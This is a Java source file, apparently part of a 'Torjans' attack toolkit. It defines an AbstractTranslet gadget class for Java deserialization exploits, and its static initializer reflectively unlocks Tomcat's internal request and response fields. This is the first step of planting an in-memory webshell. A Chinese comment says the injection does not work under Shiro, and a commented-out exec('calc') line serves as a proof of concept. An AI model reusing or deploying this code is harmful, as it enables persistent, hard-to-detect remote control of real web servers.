package com.Jasetol.Torjans;

import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

/*
* Shiro 框架无法注入
* */
public class InjectTomcat02Step01 extends AbstractTranslet {

    static {
        try{
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            wrap_same_object.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            lastServicedRequest.setAccessible(true);
            Field modifiers = Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(wrap_same_object,wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiers.setInt(lastServicedRequest,lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiers.setInt(lastServicedResponse,lastServicedResponse.getModifiers() & ~Modifier.FINAL);
            Boolean wrap = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> lastRequest = (ThreadLocal<ServletRequest>) lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> lastResponse = (ThreadLocal<ServletResponse>) lastServicedResponse.get(null);
            wrap_same_object.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal());
            lastServicedResponse.set(null,new ThreadLocal());
            ServletResponse response = (ServletResponse) lastResponse.get();
            ServletRequest request = (ServletRequest) lastRequest.get();
            ServletContext context = request.getServletContext();
            //Runtime.getRuntime().exec("calc");

        }catch (Exception e){}
    }


    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}